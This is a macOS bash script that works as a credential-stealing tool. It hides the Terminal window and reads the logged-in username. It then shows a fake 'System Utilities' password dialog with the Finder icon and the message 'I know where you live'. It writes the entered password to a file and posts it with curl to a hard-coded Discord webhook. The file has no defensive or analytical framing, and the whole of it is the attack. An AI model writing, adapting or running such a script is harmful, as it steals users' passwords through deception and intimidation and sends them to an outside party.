#!/bin/bash

# Ensure Terminal is hidden initially
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get the current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture with a header line
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for the password prompt (no timer)
read -r -d '' applescriptCode <<'EOF'
set msg to "I know where you live, " & (long user name of (system info)) & ".\n\nEnter the password for the user " & (long user name of (system info)) & " to allow this."
try
    set dialogText to text returned of (display dialog msg with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    return dialogText
on error
    return "CANCEL"
end try
EOF

# Execute the AppleScript synchronously and capture its output in a temporary file
osascript -e "$applescriptCode" > pass_temp.txt

# Read the password from the temporary file
if [ -f pass_temp.txt ]; then
    dialogText=$(cat pass_temp.txt)
    rm pass_temp.txt
else
    dialogText="CANCEL"
fi

# Append the password (or result) to the capture
capture="${capture}password=${dialogText}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Send captured data to the Discord webhook using Python for proper JSON formatting
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
